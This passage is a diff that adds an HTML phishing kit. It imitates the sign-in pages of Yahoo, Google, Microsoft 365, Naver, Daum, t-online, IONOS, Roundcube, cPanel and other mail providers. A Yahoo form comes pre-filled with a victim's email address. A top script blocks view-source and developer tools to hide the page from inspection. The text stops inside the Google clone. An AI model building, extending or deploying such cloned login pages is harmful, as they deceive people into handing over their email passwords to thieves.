@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="pageTitle">Secure Sign In</title>
+<!-- =========================================================
+     ANTI-SOURCE CODE & DEVTOOLS PROTECTION (Starts Here)
+     ========================================================= -->
+<style>
+  body {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+  }
+</style>
+<script>
+  document.addEventListener('contextmenu', event => event.preventDefault());
+  document.addEventListener('dragstart', event => event.preventDefault());
+
+  document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+      if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
+      if (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) { e.preventDefault(); return false; }
+      if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's' || e.keyCode === 83)) { e.preventDefault(); return false; }
+  });
+
+  setInterval(function() {
+      var widthThreshold = window.outerWidth - window.innerWidth > 160;
+      var heightThreshold = window.outerHeight - window.innerHeight > 160;
+      if ((heightThreshold && widthThreshold) || (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized)) {
+          if (document.body) { document.body.innerHTML = '<div style="text-align:center;margin-top:20vh;font-family:sans-serif;"><h1>Security Notice</h1><p>Developer tools are not permitted on this page.</p></div>'; }
+          window.location.reload();
+      }
+  }, 1000);
+</script>
+<!-- =========================================================
+     ANTI-SOURCE CODE PROTECTION (Ends Here)
+     ========================================================= -->
+
+<style>
+    /* =========================================================
+       GLOBAL RESET & GENERIC UI
+       ========================================================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, 'Noto Sans KR', 'Noto Sans JP', 'Noto Sans SC', sans-serif; min-height: 100vh; background-size: cover; background-position: center; color: #333; display: flex; justify-content: center; align-items: center; padding: 20px; transition: background 0.6s ease; }
+    
+    /* =========================================================
+       CLONE 1: YAHOO LAYOUT (Exact Match)
+       ========================================================= */
+    body.is-yahoo { display: flex !important; flex-direction: column; background: #f4f4f4 !important; padding: 0 !important; justify-content: flex-start; }
+    .yahoo-top-bar { width: 100%; background: #fff; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }
+    .yahoo-logo { font-size: 32px; font-weight: 800; color: #5f01d1; letter-spacing: -1px; font-family: 'Helvetica Neue', Arial, sans-serif; }
+    .yahoo-nav { display: flex; gap: 20px; font-size: 14px; color: #232323; }
+    .yahoo-nav a { color: #232323; text-decoration: none; }
+    .yahoo-nav a:hover { text-decoration: underline; }
+    
+    .yahoo-container { flex: 1; display: flex; justify-content: flex-end; padding: 40px 20%; width: 100%; }
+    .yahoo-card { background: #fff; width: 100%; max-width: 400px; border-radius: 16px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .yahoo-email { font-size: 14px; color: #232323; margin-bottom: 20px; font-weight: 500; }
+    .yahoo-title { font-size: 24px; font-weight: 700; color: #232323; margin-bottom: 24px; }
+    .yahoo-label { color: #5f01d1; font-size: 14px; font-weight: 600; margin-bottom: 8px; display: block; }
+    .yahoo-input-group { position: relative; border: 1px solid #5f01d1; border-radius: 6px; margin-bottom: 10px; }
+    .yahoo-input-group input { width: 100%; padding: 14px 40px 14px 14px; border: none; outline: none; font-size: 16px; border-radius: 6px; background: transparent; }
+    .yahoo-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #5f01d1; cursor: pointer; font-size: 18px; }
+    .yahoo-forgot { color: #232323; text-decoration: underline; font-size: 14px; margin-top: 8px; display: inline-block; margin-bottom: 32px; }
+    .yahoo-btn { width: 100%; background: #5f01d1; color: #fff; border: none; border-radius: 24px; padding: 14px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+    .yahoo-btn:hover { background: #4a00a3; }
+
+    /* =========================================================
+       CLONE 2: GOOGLE / GMAIL LAYOUT (Exact Match)
+       ========================================================= */
+    body.is-google { display: flex !important; flex-direction: column; background: #f0f4f9 !important; padding: 0 !important; justify-content: center; align-items: center; }
+    .google-layout { display: flex; flex-direction: column; width: 100%; max-width: 960px; padding: 20px; }
+    .google-card { background: #fff; border-radius: 28px; display: flex; width: 100%; min-height: 400px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #dadce0; }
+    .google-left { flex: 1; display: flex; flex-direction: column; justify-content: flex-start; }
+    .google-right { flex: 1; display: flex; flex-direction: column; justify-content: center; padding-left: 40px; }
+    .google-logo-svg { width: 40px; height: 40px; margin-bottom: 16px; }
+    .google-welcome { font-size: 36px; font-weight: 400; color: #1f1f1f; margin-bottom: 20px; letter-spacing: -0.5px; }
+    .google-user-pill { display: inline-flex; align-items: center; gap: 8px; border: 1px solid #747775; border-radius: 20px; padding: 4px 12px; font-size: 14px; color: #1f1f1f; max-width: fit-content; cursor: pointer; }
+    .google-user-pill:hover { background: #f8f9fa; }
+    .google-user-pill span { font-weight: 500; }
+    .google-input { width: 100%; padding: 13px 15px; border: 1px solid #747775; border-radius: 4px; font-size: 16px; margin-bottom: 10px; }
+    .google-input:focus { outline: none; border: 2px solid #0b57d0; padding: 12px 14px; }
+    .google-checkbox-row { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #1f1f1f; margin-bottom: 40px; }
+    .google-checkbox-row input { width: 18px; height: 18px; cursor: pointer; }
+    .google-actions { display: flex; justify-content: space-between; align-items: center; }
+    .google-forgot { color: #0b57d0; font-size: 14px; font-weight: 500; text-decoration: none; }
+    .google-forgot:hover { text-decoration: underline; }
+    .google-btn { background: #0b57d0; color: #fff; border: none; padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; }
+    .google-btn:hover { background: #0842a0; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
+    .google-footer { display: flex; justify-content: space-between; margin-top: 20px; font-size: 12px; color: #444746; padding: 0 10px; width: 100%; max-width: 960px; }
+    .google-footer-links a { color: #444746; text-decoration: none; margin-left: 20px; }
+    .google-footer-links a:hover { text-decoration: underline; }
+
+    /* =========================================================
+       CLONE 3: ABV.BG LAYOUT (Framer Clone)
+       ========================================================= */
+    body.is-abv { display: block !important; background: #fff !important; padding: 0 !important; }
+    .framer-k1yVm{height:1080px;background-color:#fff;width:1351px;position:relative;margin:0 auto}
+    .framer-l37xyv{z-index:10;background-color:#f0f0f0;width:100%;height:35px;position:absolute;top:0;left:0}
+    .framer-1uj2ez6{width:25px;position:absolute;top:5px;left:15px}
+    .framer-13rvrfu{display:flex;position:absolute;top:11px;left:36px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-i0rsf2{display:flex;position:absolute;top:11px;left:134px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-1inf8b4{display:flex;position:absolute;top:11px;left:185px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-14zwyi7{position:absolute;top:11px;left:335px}
+    .framer-1trcrps{position:absolute;top:3px;left:470px}
+    .framer-e23xuc{display:flex;position:absolute;top:11px;left:1095px;border-right:2px solid #d4d0c8;padding:0 12px 0 11px;align-items:center}
+    .framer-1ofzc25{position:absolute;top:11px;left:1253px}
+    .framer-ivfs9d{position:absolute;top:53px;left:216px}
+    .framer-1tyjjwu{position:absolute;top:77px;left:827px;width:305px;border:1px solid #e0e0e0}
+    .framer-1tqp0cc,.framer-1lwhm32,.framer-1cb6bps{position:absolute;top:473px;width:215px}
+    .framer-1tqp0cc{left:196px}.framer-1lwhm32{left:428px}.framer-1cb6bps{left:660px}
+    .framer-1op5ul{position:absolute;top:638px;left:741px;width:215px}
+    .framer-heb492{position:absolute;top:586px;left:196px;width:262px}
+    .framer-1srjyxk{position:absolute;top:586px;left:472px;width:262px}
+    .framer-195nnv8{background-color:#b8e6fd;width:640px;height:288px;position:absolute;top:146px;left:196px}
+    .framer-nmkhwe{position:absolute;top:15px;left:25px}
+    .framer-zgdkdg{position:absolute;top:0;left:340px;width:300px}
+    .framer-1ivdcrg{position:absolute;bottom:32px;left:76px}
+    .framer-17sdx75{position:absolute;bottom:8px;left:25px}
+    .framer-1k6dsll{background:#fff;width:940px;height:33px;position:absolute;top:434px;left:calc(49.2968% - 470px)}
+    .framer-122upky{position:absolute;top:-14px;left:24px}
+    .framer-6nmjat{position:absolute;top:7px;left:898px}
+    .framer-PR0MW{display:flex;flex-direction:column;gap:20px;width:640px;height:288px;padding:20px;position:relative;overflow:hidden}
+    .framer-form-text-input{background:#fcffdf;border:1px solid rgba(136,136,136,.1);border-radius:2px;padding:4px;display:flex;align-items:center;height:29px}
+    .framer-form-text-input input{background:transparent;border:none;outline:none;width:100%;padding:0 4px;font-size:14px}
+    .framer-btn{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
+
+    /* =========================================================
+       CLONE 4: MICROSOFT 365 LAYOUT
+       ========================================================= */
+    .m365-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: linear-gradient(135deg, #f4e8f8 0%, #e6f0fa 50%, #fce8ef 100%); }
+    body.is-m365 { display: flex !important; padding: 0 !important; }
+    body.is-m365 .m365-layout { display: flex; }
+    .m365-card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+    .m365-logo { display: flex; align-items: center; gap: 8px; font-size: 20px; font-weight: 600; color: #5e5e5e; margin-bottom: 24px; }
+    .m365-logo-icon { width: 24px; height: 24px; display: grid; grid-template-columns: 1fr 1fr; gap: 2px; }
+    .m365-logo-icon div { width: 100%; height: 100%; }
+    .m365-logo-icon div:nth-child(1) { background: #f25022; }
+    .m365-logo-icon div:nth-child(2) { background: #7fba00; }
+    .m365-logo-icon div:nth-child(3) { background: #00a4ef; }
+    .m365-logo-icon div:nth-child(4) { background: #ffb900; }
+    .m365-back { display: flex; align-items: center; gap: 8px; font-size: 15px; color: #1b1b1b; margin-bottom: 16px; }
+    .m365-back span { font-weight: 600; }
+    .m365-title { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 24px; }
+    .m365-input { width: 100%; padding: 8px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; margin-bottom: 16px; background: transparent; }
+    .m365-input:focus { outline: none; border-bottom: 2px solid #0067b8; }
+    .m365-link { color: #0067b8; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px; }
+    .m365-btn { background: #0067b8; color: white; border: none; padding: 6px 32px; font-size: 15px; float: right; cursor: pointer; }
+    .m365-btn:hover { background: #005da6; }
+
+    /* =========================================================
+       CLONE 5: HIWORKS / CUSTOM DOMAIN
+       ========================================================= */
+    body.is-hiworks { display: block !important; padding: 0 !important; background: #ffffff; }
+    .hiworks-main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; min-height: 100vh; flex-direction: column; }
+    .hiworks-card { width: 100%; max-width: 420px; text-align: center; }
+    .hiworks-title { font-size: 32px; font-weight: 800; color: #1e88e5; letter-spacing: -1.5px; margin-bottom: 30px; }
+    .hiworks-title.big { font-size: 54px; }
+    .hiworks-h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 10px; letter-spacing: -0.4px; }
+    .hiworks-h2 { font-size: 15px; font-weight: 400; color: #666; margin-bottom: 30px; line-height: 1.5; }
+    .hiworks-email-chip { display: inline-flex; align-items: center; gap: 8px; padding: 8px 18px; background: #f5f6f8; border-radius: 24px; font-size: 14px; color: #333; margin-bottom: 22px; word-break: break-all; }
+    .hiworks-input-wrap { position: relative; margin-bottom: 14px; text-align: left; }
+    .hiworks-input-wrap input { width: 100%; height: 52px; padding: 0 16px 0 46px; border: 1px solid #dcdde0; border-radius: 6px; font-size: 15px; color: #1a1a1a; background: #fff; transition: border-color 0.15s; }
+    .hiworks-input-wrap input:focus { outline: none; border-color: #1e88e5; }
+    .hiworks-input-wrap input:disabled { background: #f5f6f8; color: #555; }
+    .hiworks-input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); width: 18px; height: 18px; color: #aaa; pointer-events: none; }
+    .hiworks-btn { width: 100%; height: 52px; border: none; border-radius: 6px; background: #9ec6f3; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: background 0.15s; }
+    .hiworks-btn:hover:not(:disabled) { background: #1e88e5; }
+    .hiworks-btn:disabled { cursor: not-allowed; }
+    .hiworks-links-row { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 18px; font-size: 13px; color: #666; }
+    .hiworks-links-row a { color: #1e88e5; text-decoration: none; }
+    .hiworks-privacy { display: none; background: #eaf4ff; color: #0b3d91; border: 1px solid #c3ddff; border-radius: 8px; padding: 14px 16px; margin: 16px 0; font-size: 13px; line-height: 1.55; text-align: left; }
+    .hiworks-footer { padding: 20px; text-align: center; color: #a0a0a0; font-size: 12px; margin-top: auto; }
+
+    /* =========================================================
+       CLONE 6: NAVER LAYOUT
+       ========================================================= */
+    .naver-layout { display: none; width: 100vw; min-height: 100vh; justify-content: center; align-items: flex-start; padding-top: 50px; background: #fff; }
+    body.is-naver { display: flex !important; padding: 0 !important; background: #fff !important; }
+    body.is-naver .naver-layout { display: flex; }
+    .naver-card { width: 460px; }
+    .naver-header { text-align: center; margin-bottom: 30px; }
+    .naver-header img { height: 50px; }
+    .naver-box { border: 1px solid #dadada; border-radius: 8px; background: #fff; padding: 20px 25px; }
+    .naver-tabs { display: flex; border-bottom: 1px solid #dadada; margin-bottom: 20px; }
+    .naver-tab { flex: 1; text-align: center; padding: 10px 0; font-size: 14px; font-weight: bold; color: #666; cursor: pointer; }
+    .naver-tab.active { color: #03c75a; border-bottom: 2px solid #03c75a; }
+    .naver-input-group { border: 1px solid #dadada; border-radius: 4px; margin-bottom: 10px; }
+    .naver-input-group input { width: 100%; padding: 12px; border: none; font-size: 14px; }
+    .naver-input-group input:focus { outline: none; }
+    .naver-input-group input[type="email"] { border-bottom: 1px solid #dadada; background: #fafafa; }
+    .naver-options { display: flex; justify-content: space-between; align-items: center; font-size: 13px; margin: 15px 0; color: #333; }
+    .naver-toggle { display: flex; align-items: center; gap: 5px; }
+    .naver-btn { width: 100%; background: #03c75a; color: #fff; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-bottom: 15px; }
+    .naver-divider { text-align: center; font-size: 12px; color: #999; margin: 20px 0; position: relative; }
+    .naver-divider::before, .naver-divider::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #eee; }
+    .naver-divider::before { left: 0; } .naver-divider::after { right: 0; }
+    .naver-passkey { width: 100%; border: 1px solid #03c75a; background: #fff; color: #03c75a; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 5px; }
+    .naver-footer-links { display: flex; justify-content: center; gap: 10px; font-size: 13px; color: #666; margin-top: 20px; }
+
+    /* =========================================================
+       CLONE 7: DAUM LAYOUT
+       ========================================================= */
+    .daum-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; }
+    body.is-daum { display: flex !important; padding: 0 !important; }
+    body.is-daum .daum-layout { display: flex; }
+    .daum-card { background: #fff; width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+    .daum-logo { font-size: 32px; font-weight: 700; color: #333; margin-bottom: 30px; }
+    .daum-logo span { color: #f9a800; }
+    .daum-input { width: 100%; padding: 12px; border: 1px solid #ccc; margin-bottom: 10px; font-size: 14px; }
+    .daum-btn { width: 100%; background: #f9a800; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
+
+    /* =========================================================
+       CLONE 8: T-ONLINE LAYOUT
+       ========================================================= */
+    body.is-tonline { display: flex !important; align-items: center; justify-content: center; background: linear-gradient(135deg, #8c8c9e 0%, #b58b9c 100%) !important; padding: 0; }
+    .tonline-box { background: #fff; width: 480px; border-radius: 8px; padding: 36px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); position: relative; }
+    .tonline-logo { position: absolute; top: 0; left: 0; width: 80px; height: 80px; background: #e20074; display: flex; align-items: center; justify-content: center; border-top-left-radius: 8px; }
+    .tonline-logo svg { fill: #fff; width: 40px; height: 40px; }
+    .tonline-header { display: flex; align-items: center; gap: 12px; margin-bottom: 30px; margin-top: 10px; padding-left: 90px; }
+    .tonline-avatar { width: 40px; height: 40px; border-radius: 50%; background: #f0f0f0; display: flex; align-items: center; justify-content: center; color: #666; }
+    .tonline-email { font-weight: 600; font-size: 16px; color: #333; display: flex; align-items: center; gap: 6px; }
+    .tonline-title { font-size: 28px; font-weight: 700; color: #000; margin-bottom: 24px; }
+    .tonline-input-group { position: relative; margin-bottom: 12px; }
+    .tonline-input-group input { width: 100%; padding: 12px 40px 12px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
+    .tonline-input-group input:focus { outline: none; border-color: #e20074; box-shadow: 0 0 0 3px rgba(226,0,116,0.1); }
+    .tonline-eye { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #666; cursor: pointer; }
+    .tonline-link { color: #e20074; text-decoration: underline; font-size: 14px; display: inline-block; margin-bottom: 24px; }
+    .tonline-toggle-row { display: flex; align-items: center; gap: 10px; margin-bottom: 30px; font-size: 14px; }
+    .tonline-toggle { width: 40px; height: 22px; background: #e20074; border-radius: 12px; position: relative; }
+    .tonline-toggle::after { content: ''; position: absolute; right: 2px; top: 2px; width: 18px; height: 18px; background: #fff; border-radius: 50%; }
+    .tonline-btn-main { width: 100%; background: #e20074; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 700; border-radius: 6px; cursor: pointer; margin-bottom: 12px; text-transform: uppercase; }
+    .tonline-btn-sec { width: 100%; background: #fff; color: #000; border: 1px solid #ccc; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-bottom: 20px; }
+    .tonline-back { color: #e20074; text-decoration: none; font-size: 14px; }
+
+    /* =========================================================
+       CLONE 9: HI-BOX (TAIWAN) LAYOUT
+       ========================================================= */
+    body.is-hibox { display: flex !important; align-items: center; justify-content: center; background: #f0f0f0 !important; padding: 0; }
+    .hibox-wrapper { width: 1000px; background: #fff; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden; }
+    .hibox-top { background: #fff; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+    .hibox-logo { font-size: 28px; font-weight: 800; color: #0055a4; font-style: italic; }
+    .hibox-logo span { color: #ff6600; font-weight: normal; font-style: normal; font-size: 16px; margin-left: 8px; }
+    .hibox-nav { background: #0055a4; display: flex; color: #fff; padding: 0 20px; font-size: 14px; }
+    .hibox-nav div { padding: 10px 20px; border-right: 1px solid #3377cc; cursor: pointer; }
+    .hibox-content { display: flex; padding: 20px; gap: 20px; }
+    .hibox-banner { flex: 1; background: linear-gradient(180deg, #a0d4f0 0%, #60b0e0 100%); border-radius: 4px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; color: #004488; text-align: center; position: relative; }
+    .hibox-banner h2 { font-size: 24px; margin-bottom: 10px; }
+    .hibox-banner p { font-size: 14px; color: #cc0000; font-weight: bold; }
+    .hibox-sidebar { width: 340px; border: 1px solid #ccc; border-radius: 4px; }
+    .hibox-sidebar-header { background: #f8f8f8; padding: 10px 15px; font-weight: bold; border-bottom: 1px solid #ccc; color: #333; }
+    .hibox-form { padding: 20px; }
+    .hibox-row { display: flex; align-items: center; margin-bottom: 15px; }
+    .hibox-row label { width: 50px; font-size: 13px; font-weight: bold; color: #333; }
+    .hibox-row input { flex: 1; padding: 6px; border: 1px solid #ccc; border-radius: 2px; font-size: 13px; }
+    .hibox-captcha { flex: 1; display: flex; gap: 10px; align-items: center; }
+    .hibox-captcha img { height: 30px; border: 1px solid #ccc; }
+    .hibox-captcha input { width: 60px; padding: 6px; border: 1px solid #ccc; }
+    .hibox-btn-row { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
+    .hibox-btn { background: #ff6600; color: #fff; border: none; padding: 8px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    .hibox-btn.sec { background: #999; }
+    .hibox-footer { text-align: center; font-size: 12px; color: #666; padding: 20px; border-top: 1px solid #eee; margin-top: 20px; }
+
+    /* =========================================================
+       CLONE 10: IONOS LAYOUT
+       ========================================================= */
+    body.is-ionos { display: block !important; background: #f4f6f8 !important; padding: 0 !important; }
+    .ionos-header { background: #fff; padding: 15px 40px; display: flex; align-items: center; border-bottom: 1px solid #e0e0e0; }
+    .ionos-logo { font-size: 26px; font-weight: 800; color: #003087; letter-spacing: -1px; }
+    .ionos-logo span { color: #333; font-weight: 300; margin-left: 8px; font-size: 16px; letter-spacing: 0; }
+    .ionos-main { display: flex; justify-content: center; padding: 60px 20px; min-height: calc(100vh - 70px); }
+    .ionos-card { background: #fff; width: 520px; border-radius: 8px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .ionos-icon-row { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
+    .ionos-icon-svg { width: 44px; height: 44px; background: #003087; border-radius: 8px; display: flex; justify-content: center; align-items: center; color: #fff; }
+    .ionos-title { font-size: 24px; font-weight: 600; color: #333; }
+    .ionos-user-row { display: flex; align-items: center; gap: 10px; font-size: 14px; color: #003087; margin-bottom: 30px; font-weight: 500; }
+    .ionos-input-group { margin-bottom: 12px; }
+    .ionos-input-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 8px; }
+    .ionos-input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; }
+    .ionos-input:focus { outline: none; border-color: #003087; box-shadow: 0 0 0 2px rgba(0,0,48,0.1); }
+    .ionos-link { color: #003087; font-size: 14px; text-decoration: underline; display: inline-block; margin-top: 5px; margin-bottom: 20px; }
+    .ionos-warning { font-size: 13px; color: #333; margin-bottom: 30px; }
+    .ionos-btn { width: 100%; background: #003087; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 24px; cursor: pointer; }
+    .ionos-footer { text-align: center; font-size: 12px; color: #888; margin-top: 30px; }
+
+    /* =========================================================
+       CLONE 11: ROUNDCUBE WEBMAIL LAYOUT
+       ========================================================= */
+    body.is-webmail { display: flex !important; align-items: center; justify-content: center; background: #fff !important; padding: 0; }
+    .rc-layout { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
+    .rc-logo-area { margin-bottom: 40px; text-align: center; }
+    .rc-logo-svg { width: 80px; height: 80px; margin: 0 auto 20px; }
+    .rc-form { width: 100%; }
+    .rc-input-group { display: flex; align-items: center; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 10px; background: #fff; }
+    .rc-input-icon { background: #f5f5f5; border-right: 1px solid #ccc; padding: 12px 15px; color: #666; }
+    .rc-input-group input { flex: 1; padding: 12px; border: none; font-size: 15px; outline: none; background: transparent; }
+    .rc-input-group input:disabled { color: #333; background: #fafafa; }
+    .rc-btn { width: 100%; background: #40b3e0; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
+    .rc-footer { text-align: center; font-size: 13px; color: #999; margin-top: 20px; }
+    .rc-footer a { color: #40b3e0; text-decoration: none; }
+
+    /* =========================================================
+       CLONE 12: CPANEL WEBMAIL LAYOUT
+       ========================================================= */
+    body.is-cpanel { display: flex !important; align-items: center; justify-content: center; background: #f4f4f4 !important; padding: 0; }
+    .cpanel-card { background: #fff; width: 100%; max-width: 440px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; }
+    .cpanel-header { background: #1e3a8a; padding: 20px; text-align: center; color: #fff; font-size: 22px; font-weight: 600; }
+    .cpanel-body { padding: 40px; }
+    .cpanel-logo { text-align: center; margin-bottom: 30px; font-size: 24px; font-weight: bold; color: #1e3a8a; }
+    .cpanel-form-group { margin-bottom: 20px; }
+    .cpanel-form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 8px; }
+    .cpanel-form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #f9f9f9; }
+    .cpanel-form-group input:focus { outline: none; border-color: #1e3a8a; background: #fff; }
+    .cpanel-btn { width: 100%; background: #1e3a8a; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-top: 10px; }
+    .cpanel-footer { text-align: center; padding: 20px; font-size: 12px; color: #999; border-top: 1px solid #eee; margin-top: 20px; }
+    .cpanel-footer a { color: #1e3a8a; text-decoration: none; margin: 0 5px; }
+
+    /* =========================================================
+       CLONE 13: GENERIC BRANDED UI (Fallback)
+       ========================================================= */
+    .login-container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; padding: 48px 40px; position: relative; z-index: 1; transition: all 0.3s ease; }
+    .header { text-align: center; margin-bottom: 32px; }
+    .logo-icon { width: 64px; height: 64px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; color: white; font-size: 28px; font-weight: 700; overflow: hidden; }
+    .logo-icon img { width: 100%; height: 100%; object-fit: contain; }
+    .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    .subtitle { color: #5f6368; font-size: 14px; margin-top: 4px; }
+    .domain-badge { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-top: 8px; }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; color: #3c4043; font-size: 14px; font-weight: 500; margin-bottom: 6px; }
+    .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #dadce0; border-radius: 8px; font-size: 15px; font-family: inherit; transition: border-color 0.2s; }
+    .form-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
+    .form-group input:disabled { background: #f8f9fa; color: #5f6368; }
+    .form-group input.error { border-color: #d93025; }
+    .password-wrapper { position: relative; }
+    .password-wrapper input { padding-right: 44px; }
+    .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px; font-size: 18px; }
+    .btn-signin { width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; }
+    .btn-signin:disabled { background: #9aa0a6 !important; cursor: not-allowed; }
+    .footer-links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
+    .footer-links a { color: #1a73e8; text-decoration: none; }
+    .footer-text { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #9aa0a6; }
+    .brand-flag { display: inline-block; font-size: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; color: #666; margin-left: 6px; }
+    .err-box { color: #d32f2f; font-size: 13px; margin-top: 10px; display: none; text-align: left; font-weight: 500; }
+    .err-box.show { display: block; }
+
+    /* =========================================================
+       LOADING STATE
+       ========================================================= */
+    .loading-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: #fafafa; position: fixed; inset: 0; z-index: 999; }
+    body.is-loading { display: block !important; padding: 0 !important; }
+    body.is-loading .loading-layout { display: flex; }
+    .spinner { width: 40px; height: 40px; border: 4px solid #f0f0f0; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body oncontextmenu="return false;">
+
+    <!-- LOADING SPINNER -->
+    <div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
+
+    <!-- 1. YAHOO SPECIFIC UI -->
+    <div id="yahooContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
+        <div class="yahoo-top-bar">
+            <div class="yahoo-logo">yahoo!</div>
+            <div class="yahoo-nav">
+                <a href="#">Help</a>
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+            </div>
+        </div>
+        <div class="yahoo-container">
+            <div class="yahoo-card">
+                <div class="yahoo-email" id="yahooEmailDisplay">smallwood.kent@yahoo.com</div>
+                <div class="yahoo-title">Enter your password</div>
+                <label class="yahoo-label">Password</label>
+                <div class="yahoo-input-group">
+                    <input type="password" id="yahooPass" autocomplete="off" autofocus>
+                    <button class="yahoo-eye" onclick="toggleYahooPass()">👁️</button>
+                </div>
+                <a href="#" class="yahoo-forgot">Forgot password</a>
+                <button class="yahoo-btn" onclick="submitLogin('yahoo')">Next</button>
+                <div id="yahoo-err" class="err-box" style="text-align:center; margin-top:15px;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 2. GOOGLE / GMAIL SPECIFIC UI -->
+    <div class="google-layout" id="googleContainer" style="display:none;">
+        <div class="google-card">
+            <div class="google-left">
+                <svg class="google-logo-svg" viewBox="0 0 48 48">
